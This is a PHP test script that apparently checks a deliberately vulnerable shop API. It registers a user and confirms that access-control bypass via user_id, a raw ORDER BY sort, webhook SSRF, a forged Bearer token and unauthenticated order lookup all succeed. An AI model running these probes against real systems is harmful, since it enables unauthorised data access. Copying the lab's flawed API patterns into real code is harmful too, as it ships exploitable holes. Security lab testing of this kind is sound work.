<?php
/**
 * CLI: php scripts/test_vuln_apis.php [baseUrl]
 * Default base: http://localhost
 */
$base = $argv[1] ?? 'http://localhost';
$cookieFile = sys_get_temp_dir() . '/vuln_test_cookies_' . getmypid() . '.txt';

function http(string $method, string $url, ?string $json = null, string $cookieFile = '', array $extraHeaders = []): array {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    if ($cookieFile !== '') {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    }
    $h = ['Accept: application/json'];
    if ($json !== null) {
        $h[] = 'Content-Type: application/json';
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
    }
    foreach ($extraHeaders as $eh) {
        $h[] = $eh;
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
    $body = curl_exec($ch);
    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    return ['code' => $code, 'body' => $body, 'err' => $err];
}

function j(string $s): array {
    $d = json_decode($s, true);
    return is_array($d) ? $d : [];
}

echo "Base URL: {$base}\n\n";

$email = 'vuln_test_' . bin2hex(random_bytes(4)) . '@example.com';
$pass = 'TestPass123!';

// 1) Register
$reg = [
    'action' => 'register',
    'email' => $email,
    'password' => $pass,
    'first_name' => 'Lab',
    'last_name' => 'User',
    'phone' => '9876543210',
];
$r = http('POST', rtrim($base, '/') . '/api/v1/auth.php', json_encode($reg), $cookieFile);
$regData = j($r['body']);
$ok = ($r['code'] === 201 && !empty($regData['success']));
echo '[1] Register signup: ' . ($ok ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";
if (!$ok) {
    echo $r['body'] . "\n";
    @unlink($cookieFile);
    exit(1);
}
$myId = (int) ($regData['data']['id'] ?? 0);
echo "    New user id: {$myId}, email: {$email}\n";

// 2) Session / verify
$r = http('GET', rtrim($base, '/') . '/api/v1/auth.php', null, $cookieFile);
$ses = j($r['body']);
$ok2 = ($r['code'] === 200 && !empty($ses['authenticated']));
echo '[2] Session verify: ' . ($ok2 ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";

// 3) IDOR profile — fetch user_id=1 if different from self
$target = $myId === 1 ? 2 : 1;
$r = http('GET', rtrim($base, '/') . '/api/v1/auth.php?user_id=' . $target, null, $cookieFile);
$idor = j($r['body']);
$idorOk = ($r['code'] === 200 && !empty($idor['data']['id']) && (int) $idor['data']['id'] === $target);
echo '[3] Profile IDOR (?user_id=' . $target . '): ' . ($idorOk ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";
if (!$idorOk) {
    echo '    ' . substr($r['body'], 0, 200) . "\n";
}

// 4) Orders list IDOR
$r = http('GET', rtrim($base, '/') . '/api/v1/orders.php?user_id=' . $target, null, $cookieFile);
$ord = j($r['body']);
$ordOk = ($r['code'] === 200 && isset($ord['success']) && $ord['success'] === true && isset($ord['data']));
echo '[4] Orders list IDOR (?user_id=' . $target . '): ' . ($ordOk ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";

// 5) Addresses IDOR
$r = http('GET', rtrim($base, '/') . '/api/v1/addresses.php?user_id=' . $target, null, $cookieFile);
$addr = j($r['body']);
$addrOk = ($r['code'] === 200 && !empty($addr['success']));
echo '[5] Addresses IDOR (?user_id=' . $target . '): ' . ($addrOk ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";

// 6) Categories ORDER BY
$r = http('GET', rtrim($base, '/') . '/api/v1/categories.php?sort=id%20DESC', null, '');
$cat = j($r['body']);
$firstId = $cat['categories'][0]['id'] ?? null;
$catOk = ($r['code'] === 200 && $firstId !== null);
echo '[6] Categories sort=id DESC: ' . ($catOk ? 'PASS' : 'FAIL') . " (HTTP {$r['code']}, first id={$firstId})\n";

// 7) Webhook / SSRF
$r = http('POST', rtrim($base, '/') . '/api/v1/webhook-test.php', json_encode(['url' => 'https://httpbin.org/get']), '');
$wh = j($r['body']);
$whOk = ($r['code'] === 200 && !empty($wh['success']) && !empty($wh['preview']));
echo '[7] Webhook fetch (httpbin): ' . ($whOk ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";

// 8) Integration forged token
$token = base64_encode(json_encode(['api_key' => 'forged-key', 'api_key_id' => 1, 'scopes' => ['products']]));
$r = http('GET', rtrim($base, '/') . '/api/v1/integration/products.php', null, '', [
    'Authorization: Bearer ' . $token,
]);
$intOk = ($r['code'] === 200);
echo '[8] Integration API forged Bearer: ' . ($intOk ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";

// 9) Order by id without auth (no cookie)
$r = http('GET', rtrim($base, '/') . '/api/v1/orders.php?order_id=1', null, '');
$o2 = j($r['body']);
// Pass if 404 not found (no order) or 200 with data — both prove endpoint accepts unauthenticated lookup
$orderIdOk = ($r['code'] === 404 || $r['code'] === 200);
echo '[9] Order detail ?order_id=1 (no session): ' . ($orderIdOk ? 'PASS' : 'FAIL') . " (HTTP {$r['code']})\n";

@unlink($cookieFile);

echo "\nDone.\n";
